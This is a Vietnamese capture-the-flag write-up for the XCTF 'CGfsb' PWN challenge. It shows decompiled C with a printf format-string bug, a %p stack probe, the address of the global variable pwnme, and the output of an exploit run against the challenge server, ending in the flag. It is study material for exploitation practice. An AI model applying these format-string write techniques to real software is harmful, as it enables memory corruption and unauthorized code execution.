# XCTF - PWN Exercise - CGfsb

```c
#include<stdio.h>
int pwnme;

int __cdecl main(int argc, const char **argv, const char **envp)
{
  _DWORD buf[2]; // [esp+1Eh] [ebp-7Eh] BYREF
  __int16 v5; // [esp+26h] [ebp-76h]
  char s[100]; // [esp+28h] [ebp-74h] BYREF

  unsigned int v7; // [esp+8Ch] [ebp-10h]
  v7 = __readgsdword(0x14u);

  setbuf(stdin, 0);
  setbuf(stdout, 0);
  setbuf(stderr, 0);
  
  buf[0] = 0;
  buf[1] = 0;
  v5 = 0;
  memset(s, 0, sizeof(s));
  puts("please tell me your name:");
  read(0, buf, 0xAu);
  puts("leave your message please:");
  fgets(s, 100, stdin);
  printf("hello %s", (const char *)buf);
  puts("your message is:");
  printf(s);
  if ( pwnme == 8 )
  {
    puts("you pwned me, here is your flag:\n");
    system("cat flag");
  }
  else
  {
    puts("Thank you!");
  }
  return 0;
}
```

Kiếm tra các flag secure trước.

```
l1j9m4 in ~/0_PWNable/ADworld_XCTF/Exersice/7_CGfsb λ checksec CGfsb 
[*] '/home/l1j9m4/0_PWNable/ADworld_XCTF/Exersice/7_CGfsb/CGfsb'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

Rất dễ để nhận ra có lỗi `format string` trên biến s và mục tiêu của chúng ta là làm giá trị của biến toàn cục `pwnme` = 8.

  +) Tìm xem chuỗi `s` bắt đầu từ parameter thứ mấy trên stack.

  +) Tìm địa chỉ của biến toàn cục `pwnme`.
    
```
l1j9m4 in ~/0_PWNable/ADworld_XCTF/Exersice/7_CGfsb λ ./CGfsb 
please tell me your name:
nigma
leave your message please:
AAAA-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p
hello nigma
your message is:
AAAA-0xff974ade-0xf7ebd580-0x1-(nil)-0x1-0xf7f0a990-0x696e0001-0xa616d67-(nil)-0x41414141-0x2d70252d-0x252d7025-0x70252d70
Thank you!
```

```
pwndbg> p &pwnme
$1 = (<data variable, no debug info> *) 0x804a068 <pwnme>
```

Chuỗi `s` bắt đầu từ parameter thứ 10 và biến toàn cục `pwnme` nằm ở địa chỉ `0x0804A068`. 

Tiến hành viết file [exploit.py](exploit.py) và khai thác:

```
l1j9m4 in ~/0_PWNable/ADworld_XCTF/Exersice/7_CGfsb λ python2 exploit.py 
[+] Opening connection to 111.200.241.244 on port 60401: Done
[*] Switching to interactive mode
hello nigma
your message is:
h\xa0\x04AAAA
you pwned me, here is your flag:

cyberpeace{b1d70a92eb0bedd3af590ff7c27b828e}
[*] Got EOF while reading in interactive
$  
```
